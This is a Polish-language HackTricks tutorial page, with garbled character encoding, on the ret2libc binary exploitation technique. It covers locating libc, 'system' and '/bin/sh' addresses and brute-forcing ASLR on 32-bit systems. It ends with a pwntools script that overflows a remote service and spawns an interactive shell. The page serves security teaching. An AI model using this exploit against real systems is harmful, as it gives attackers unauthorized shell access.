# Ret2lib

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

Idea **Ret2Libc** polega na przekierowaniu przepÅ‚ywu wykonania podatnego programu do funkcji w wspÃ³Å‚dzielonej bibliotece (np. **system**, **execve**, **strcpy**) zamiast wykonywania kodu shellcode dostarczonego przez atakujÄ…cego na stosie. AtakujÄ…cy tworzy Å‚adunek, ktÃ³ry modyfikuje adres powrotu na stosie, aby wskazywaÅ‚ na poÅ¼Ä…danÄ… funkcjÄ™ bibliotecznÄ…, jednoczeÅ›nie zapewniajÄ…c, Å¼e wszelkie konieczne argumenty sÄ… poprawnie ustawione zgodnie z konwencjÄ… wywoÅ‚ania.

### **PrzykÅ‚adowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywoÅ‚ania (np. system) i polecenie do wywoÅ‚ania (np. /bin/sh)
* Wygeneruj Å‚aÅ„cuch ROP, aby przekazaÄ‡ pierwszy argument wskazujÄ…cy na ciÄ…g poleceÅ„ oraz przepÅ‚yw wykonania do funkcji

## Znajdowanie adresÃ³w

* ZakÅ‚adajÄ…c, Å¼e uÅ¼ywana jest biblioteka `libc` z bieÅ¼Ä…cej maszyny, moÅ¼na znaleÅºÄ‡, gdzie zostanie zaÅ‚adowana w pamiÄ™ci za pomocÄ…:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
JeÅ›li chcesz sprawdziÄ‡, czy ASLR zmienia adres libc, moÅ¼esz to zrobiÄ‡:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ przesuniÄ™cie do funkcji `system` za pomocÄ…:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ przesuniÄ™cie do funkcji Å‚aÅ„cucha `/bin/sh` za pomocÄ…:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### UÅ¼ywajÄ…c gdb-peda / GEF

ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ Peda lub GEF, aby uzyskaÄ‡ adres funkcji **system**, funkcji **exit** i ciÄ…gu znakÃ³w **`/bin/sh`**:
```
p system
p exit
find "/bin/sh"
```
### Korzystanie z /proc/\<PID>/maps

JeÅ›li proces tworzy **dzieci** za kaÅ¼dym razem, gdy z nim rozmawiasz (serwer sieciowy), sprÃ³buj **odczytaÄ‡** ten plik (prawdopodobnie bÄ™dziesz musiaÅ‚ byÄ‡ rootem).

Tutaj moÅ¼esz znaleÅºÄ‡ **dokÅ‚adne miejsce, gdzie jest zaÅ‚adowany libc** wewnÄ…trz procesu i **gdzie bÄ™dzie zaÅ‚adowany** dla kaÅ¼dego dziecka procesu.

![](<../../../../.gitbook/assets/image (95).png>)

W tym przypadku jest zaÅ‚adowany pod adresem **0xb75dc000** (BÄ™dzie to adres bazowy libc)

## Nieznany libc

MoÅ¼e byÄ‡ moÅ¼liwe, Å¼e **nie znasz libc, ktÃ³re jest Å‚adowane przez binarny plik** (poniewaÅ¼ moÅ¼e znajdowaÄ‡ siÄ™ na serwerze, do ktÃ³rego nie masz dostÄ™pu). W takim przypadku moÅ¼esz wykorzystaÄ‡ podatnoÅ›Ä‡ do **wycieku niektÃ³rych adresÃ³w i znalezienia, ktÃ³ry libc** jest uÅ¼ywany:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz tutaj:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Omijanie ASLR w 32 bitach

Te ataki brute-force sÄ… **przydatne tylko dla systemÃ³w 32-bitowych**.

* JeÅ›li exploit jest lokalny, moÅ¼esz sprÃ³bowaÄ‡ bruteforce'owaÄ‡ adres bazowy libc (przydatne dla systemÃ³w 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* JeÅ›li atakujesz zdalny serwer, moÅ¼esz sprÃ³bowaÄ‡ **przeprowadziÄ‡ atak siÅ‚owy na adres funkcji `libc` `usleep`**, przekazujÄ…c jako argument 10 (na przykÅ‚ad). JeÅ›li w pewnym momencie **serwer potrzebuje dodatkowych 10 sekund na odpowiedÅº**, oznacza to, Å¼e znalazÅ‚eÅ› adres tej funkcji.

## Jedno NarzÄ™dzie

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## PrzykÅ‚ad Kodu x86 Ret2lib

W tym przykÅ‚adzie atak siÅ‚owy ASLR jest zintegrowany w kodzie, a podatny plik binarny znajduje siÄ™ na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## PrzykÅ‚ad kodu x64 Ret2lib

SprawdÅº przykÅ‚ad z:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-do-printf (lub puts)

Pozwala to **wyciekaÄ‡ informacje z procesu** poprzez wywoÅ‚anie `printf`/`puts` z okreÅ›lonymi danymi umieszczonymi jako argument.

## Ret2printf

Oznacza to w zasadzie naduÅ¼ycie **Ret2lib w celu przeksztaÅ‚cenia go w podatnoÅ›Ä‡ na Å‚aÅ„cuchy formatujÄ…ce `printf`**, korzystajÄ…c z `ret2lib` do wywoÅ‚ania printf z wartoÅ›ciami do jej wykorzystania (brzmi bezuÅ¼ytecznie, ale jest to moÅ¼liwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
